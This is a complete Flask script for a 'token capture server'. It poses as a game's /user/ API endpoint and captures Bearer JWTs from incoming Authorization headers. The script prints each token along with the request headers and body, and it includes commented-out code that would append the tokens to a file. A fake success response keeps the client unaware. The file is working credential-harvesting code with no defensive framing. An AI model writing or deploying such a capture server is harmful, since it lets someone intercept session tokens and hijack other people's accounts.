from flask import Flask, request, jsonify
import json
import os
from datetime import datetime

app = Flask(__name__)

@app.route('/user/<user_id>/', defaults={'subpath': ''}, methods=['GET', 'POST'])
@app.route('/user/<user_id>/<path:subpath>', methods=['GET', 'POST'])
def capture(user_id, subpath):
    try:
        print(f"\n🔹 Incoming request from {user_id}")
        print(f"   Sub‑path: {subpath if subpath else '(root)'}")
        print(f"   Method: {request.method}")

        # ── CAPTURE JWT FROM AUTHORIZATION HEADER ──
        auth_header = request.headers.get('Authorization')
        if auth_header and auth_header.startswith('Bearer '):
            jwt_token = auth_header[7:]  # remove "Bearer "
            print(f"\n✅ JWT CAPTURED! 🎯")
            print(f"   JWT: {jwt_token}")
            # Optional: save to file
            # with open("jwts.txt", "a") as f:
            #     f.write(f"{jwt_token}\n")
        else:
            print("   No JWT in Authorization header.")

        # Log other headers (optional)
        print(f"   Headers: {dict(request.headers)}")

        # Log body (if any) – not needed for JWT, but keep for debugging
        data = request.get_json(silent=True)
        if data:
            print(f"   Body JSON: {json.dumps(data, indent=2)}")
        else:
            raw = request.get_data(as_text=True)
            if raw:
                print(f"   Raw body: {raw[:500]}...")

        # Respond with success (keep game happy)
        return jsonify({"status": "success", "message": "OK"}), 200

    except Exception as e:
        print(f"❌ Error: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/')
def home():
    return "Token capture server is running!", 200

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)